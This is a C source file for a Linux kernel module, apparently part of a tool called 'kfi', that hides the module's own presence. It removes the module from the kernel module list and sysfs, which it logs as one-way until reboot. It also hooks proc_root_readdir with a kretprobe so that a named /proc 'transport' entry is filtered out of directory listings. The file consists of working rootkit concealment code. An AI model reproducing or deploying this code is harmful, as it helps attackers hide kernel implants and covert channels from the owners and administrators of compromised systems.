// SPDX-License-Identifier: GPL-2.0
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/hashtable.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/version.h>
#include <linux/ptrace.h>

#include <asm/ptrace.h>

#include "kfi_visibility.h"
#include "kfi_internal.h"

static DEFINE_MUTEX(kfi_visibility_lock);
static bool kfi_module_hidden;
static bool kfi_proc_hidden;

#ifdef CONFIG_KPROBES
struct kfi_proc_probe_data {
	struct hlist_node node;
	struct dir_context *ctx;
	filldir_t actor;
};

static char kfi_hidden_proc_name[256];
static struct kretprobe kfi_proc_readdir_probe;
static DEFINE_SPINLOCK(kfi_proc_actor_lock);
static DEFINE_HASHTABLE(kfi_proc_actors, 6);

static bool kfi_proc_name_matches(const char *name, int namelen)
{
	size_t hidden_len = strnlen(kfi_hidden_proc_name,
				   sizeof(kfi_hidden_proc_name));

	return namelen >= 0 && (size_t)namelen == hidden_len &&
		!memcmp(name, kfi_hidden_proc_name, hidden_len);
}

static filldir_t kfi_proc_original_actor(struct dir_context *ctx)
{
	struct kfi_proc_probe_data *data;
	filldir_t actor = NULL;

	spin_lock(&kfi_proc_actor_lock);
	hash_for_each_possible(kfi_proc_actors, data, node,
			       (unsigned long)ctx) {
		if (data->ctx == ctx) {
			actor = data->actor;
			break;
		}
	}
	spin_unlock(&kfi_proc_actor_lock);
	return actor;
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(6, 1, 0)
static int kfi_proc_filter(struct dir_context *ctx, const char *name,
			   int namelen, loff_t offset, u64 ino,
			   unsigned int d_type)
{
	filldir_t actor = kfi_proc_original_actor(ctx);

	if (kfi_proc_name_matches(name, namelen))
		return 0;
	return actor ? actor(ctx, name, namelen, offset, ino, d_type) : 0;
}
#else
static bool kfi_proc_filter(struct dir_context *ctx, const char *name,
			    int namelen, loff_t offset, u64 ino,
			    unsigned int d_type)
{
	filldir_t actor = kfi_proc_original_actor(ctx);

	/* A bool directory actor returns true to stop iteration.  Skipping a
	 * hidden entry must return false so enumeration can continue.
	 */
	if (kfi_proc_name_matches(name, namelen))
		return false;
	return actor ? actor(ctx, name, namelen, offset, ino, d_type) : false;
}
#endif

static int kfi_proc_readdir_entry(struct kretprobe_instance *instance,
				  struct pt_regs *regs)
{
	struct kfi_proc_probe_data *data = instance->data;
	struct dir_context *ctx;

	ctx = (struct dir_context *)regs_get_kernel_argument(regs, 1);
	if (!ctx || !ctx->actor)
		return 1;

	data->ctx = ctx;
	data->actor = READ_ONCE(ctx->actor);
	INIT_HLIST_NODE(&data->node);

	spin_lock(&kfi_proc_actor_lock);
	hash_add(kfi_proc_actors, &data->node, (unsigned long)ctx);
	spin_unlock(&kfi_proc_actor_lock);
	WRITE_ONCE(ctx->actor, kfi_proc_filter);
	return 0;
}

static int kfi_proc_readdir_return(struct kretprobe_instance *instance,
				   struct pt_regs *regs)
{
	struct kfi_proc_probe_data *data = instance->data;

	(void)regs;
	if (!data->ctx)
		return 0;

	if (READ_ONCE(data->ctx->actor) == kfi_proc_filter)
		WRITE_ONCE(data->ctx->actor, data->actor);

	spin_lock(&kfi_proc_actor_lock);
	if (!hlist_unhashed(&data->node))
		hash_del(&data->node);
	spin_unlock(&kfi_proc_actor_lock);
	data->ctx = NULL;
	data->actor = NULL;
	return 0;
}
#endif

int kfi_visibility_hide_module(void)
{
	mutex_lock(&kfi_visibility_lock);
	if (!kfi_module_hidden) {
		list_del_init(&THIS_MODULE->list);
		kobject_del(&THIS_MODULE->mkobj.kobj);
		kfi_module_hidden = true;
		pr_info("kfi: module hidden (one-way until reboot)\n");
	}
	mutex_unlock(&kfi_visibility_lock);
	return 0;
}

u64 kfi_visibility_capabilities(void)
{
	return KFI_CAP_MODULE_HIDING;
}

int kfi_visibility_proc_hide_start(const char *name)
{
#ifdef CONFIG_KPROBES
	int error;

	if (!name || !*name)
		return -EINVAL;

	mutex_lock(&kfi_visibility_lock);
	if (kfi_proc_hidden) {
		mutex_unlock(&kfi_visibility_lock);
		return 0;
	}

	strscpy(kfi_hidden_proc_name, name, sizeof(kfi_hidden_proc_name));
	hash_init(kfi_proc_actors);
	memset(&kfi_proc_readdir_probe, 0, sizeof(kfi_proc_readdir_probe));
	kfi_proc_readdir_probe.kp.symbol_name = "proc_root_readdir";
	kfi_proc_readdir_probe.entry_handler = kfi_proc_readdir_entry;
	kfi_proc_readdir_probe.handler = kfi_proc_readdir_return;
	kfi_proc_readdir_probe.data_size = sizeof(struct kfi_proc_probe_data);
	kfi_proc_readdir_probe.maxactive = 64;
	error = register_kretprobe(&kfi_proc_readdir_probe);
	if (!error) {
		kfi_proc_hidden = true;
		pr_info("kfi: proc transport hidden (%s)\n", kfi_hidden_proc_name);
	}
	mutex_unlock(&kfi_visibility_lock);
	return error;
#else
	return -EOPNOTSUPP;
#endif
}

void kfi_visibility_proc_hide_stop(void)
{
#ifdef CONFIG_KPROBES
	mutex_lock(&kfi_visibility_lock);
	if (kfi_proc_hidden) {
		unregister_kretprobe(&kfi_proc_readdir_probe);
		kfi_proc_hidden = false;
		memset(kfi_hidden_proc_name, 0, sizeof(kfi_hidden_proc_name));
		pr_info("kfi: proc transport visibility hook removed\n");
	}
	mutex_unlock(&kfi_visibility_lock);
#endif
}

bool kfi_visibility_proc_hide_active(void)
{
	return READ_ONCE(kfi_proc_hidden);
}
